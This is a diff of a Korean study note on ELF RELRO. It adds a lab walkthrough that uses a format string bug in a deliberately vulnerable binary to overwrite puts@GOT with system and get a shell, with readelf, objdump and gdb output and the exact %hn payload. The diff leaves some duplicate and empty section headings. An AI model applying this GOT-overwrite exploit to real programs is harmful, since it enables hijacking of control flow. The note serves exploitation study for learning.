@@ -354,7 +354,7 @@ Partial/Full RELRO의 2가지 버전으로 빌드하여 동작을 비교한다.
 두 바이너리에 GOT overwrite 기법을 사용한 동일 페이로드를 사용하여 
 왜 공격이 성공 혹은 실패하는지 확인하는 것을 목표로 한다.
 
-### 4.1 취약 코드
+### 6.1 취약 코드
 
 ``` c
 // filename: sample.c
@@ -383,7 +383,7 @@ int main() {
 * `printf(buf)`: Format String Bug
 * `puts("/bin/sh")`: `puts()` 대신 `system()` 이 호출되도록 하면 쉘 획득 가능
 
-### 4.2 컴파일 옵션
+### 6.2 컴파일 옵션
 
 #### 1) Partial RELRO
 
@@ -408,11 +408,153 @@ int main() {
 * `-Wl,-z,relro` : ELF에 `PT_GNU_RELRO` 생성
 ---
 
-## 7. Full RELRO
+## 7. RELRO 적용 범위 비교
+
+### 7.1 Partial RELRO
+
+#### Program Header
+
+`PT_GNU_RELRO` 적용 범위를 확인한다.
+
+```
+$ readelf -l /tmp/relro-lab/relro-partial | grep GNU_RELRO
+  GNU_RELRO      0x002f00 0x0804bf00 0x0804bf00 0x00100 0x00100 R   0x1
+```
+
+0x0804bf00 ~ 0x0804c000에 RELRO를 적용함을 알 수 있다. </br>
+이 부분이 실행 후 read-only로 변경되어 보호받을 수 있다.
+
+#### Section Header
+
+`.got`와 `.got.plt` 섹션이 RELRO 적용 범위에 포함되는지 확인한다.
+
+```
+$ readelf -S /tmp/relro-lab/relro-partial | egrep ".got|.got.plt"
+  [21] .got              PROGBITS        0804bff0 002ff0 000004 04  WA  0   0  4
+  [22] .got.plt          PROGBITS        0804bff4 002ff4 000028 04  WA  0   0  4
+```
+
+* `.got` 범위: 0x0804bff0 ~ 0x0804bff3
+* `.got.plt` 범위: 0x0804bff4 ~ 0x0804c01b
+
+`.got.plt` 일부는 RELRO 적용을 받지 못하는 범위에 있다.
+
+### 7.2
 
 ---
 
-## 8. Rartial RELRO
+## 7. Partial RELRO
+
+### 7.1 주소 확인
+
+puts@GOT: 0804c010
+```
+$ objdump -R /tmp/relro-lab/relro-partial | grep puts
+0804c010 R_386_JUMP_SLOT puts@GLIBC_2.0
+```
+
+system offset: 00050430
+```
+$ readelf -s /usr/lib/i386-linux-gnu/libc.so.6 | grep " system@@"
+1147: 00050430 63 FUNC WEAK DEFAULT 15 system@@GLIBC_2.0
+```
+
+libc base: 0xf7d95000 - 0x23000 = 0xf7d72000
+```
+(gdb) info proc mappings
+process 6139
+Mapped address spaces:
+  Start Addr End Addr   Size     Offset   Perms objfile
+  0xf7d95000 0xf7f1c000 0x187000 0x23000  r-xp   /usr/lib/i386-linux-gnu/libc.so.6
+  0xf7f1c000 0xf7fa1000 0x85000  0x1aa000 r--p   /usr/lib/i386-linux-gnu/libc.so.6
+  0xf7fa1000 0xf7fa3000 0x2000   0x22f000 r--p   /usr/lib/i386-linux-gnu/libc.so.6
+  0xf7fa3000 0xf7fa4000 0x1000   0x231000 rw-p   /usr/lib/i386-linux-gnu/libc.so.6
+```
+
+### 7.2 FSB offset 확인
+
+```
+$ /tmp/relro-lab/relro-partial
+input:
+AAAA.%x.%x.%x.%x.%x
+AAAA.80.f7fa35c0.80491e8.41414141.2e78252e
+/bin/sh
+```
+
+4번째 인자로 AAAA가 출력됨 → buf가 4번째 인자 위치에 있음
+
+offset = 4
+
+### 7.3 payload 구성
+
+2바이트씩 쪼개넣기
+
+```
+[주소1][주소2][출력 길이 조절][%4$hn][출력 길이 조절][%5$hn]
+```
+
+현재 값:
+* puts@GOT   = 0x0804c010
+* system     = 0xf7dc2430
+* FSB offset = 4
+
+목표: 
+```
+0x0804c010: 0xf7dc2430
+```
+
+최종 페이로드 구조:
+```
+[p32(puts@GOT)]
+[p32(puts@GOT+2)]
+%9256c
+%4$hn
+%54188c
+%5$hn
+```
+
+### 7.4 watchpoint로 GOT 변경 확인
+
+```
+Hardware watchpoint 2: *(int*)0x0804c010
+
+Old value = -136436688
+New value = -136567760
+0xf7dd22e0 in printf_positional (buf=buf@entry=0xffffcd40, 
+    format=format@entry=0xffffce30 "\020\300\004\b\022\300\004\b%9256c%4$hn%54188c%5$hn", 
+    readonly_format=readonly_format@entry=0, ap=<optimized out>, 
+    ap_savep=<optimized out>, nspecs_done=3, lead_str_end=<optimized out>, 
+    work_buffer=<optimized out>, save_errno=<optimized out>, grouping=<optimized out>, 
+    thousands_sep=<optimized out>, mode_flags=<optimized out>)
+    at ./stdio-common/vfprintf-process-arg.c:350
+350	in ./stdio-common/vfprintf-process-arg.c
+```
+
+`puts@GOT`에 watchpoint를 설정한 결과, `printf(buf)` 처리 중 GOT 엔트리 값이 변경되는 것을 확인했다.
+
+### 7.5 `puts@plt` → `system` 이동 확인
+
+```
+(gdb) c
+Continuing.
+                                                                                           �
+Breakpoint 1, 0x0804923c in main ()
+(gdb) si
+0x08049070 in puts@plt ()
+(gdb) si
+__libc_system (line=0x804a00f "/bin/sh") at ../sysdeps/posix/system.c:202
+warning: 202	../sysdeps/posix/system.c: No such file or directory
+```
+
+이후 `puts("/bin/sh")` 호출 시 `puts@plt`를 거쳐, 
+실제 `puts()`가 아니라 `__libc_system("/bin/sh")`로 제어가 이동했다.
+
+Partial RELRO 상태에서는 `.got.plt`가 writable이므로, 
+GOT overwrite를 통해 함수 호출 흐름을 변경할 수 있음을 확인했다.
+
+---
+
+## 8. Full RELRO
 
 ---
 
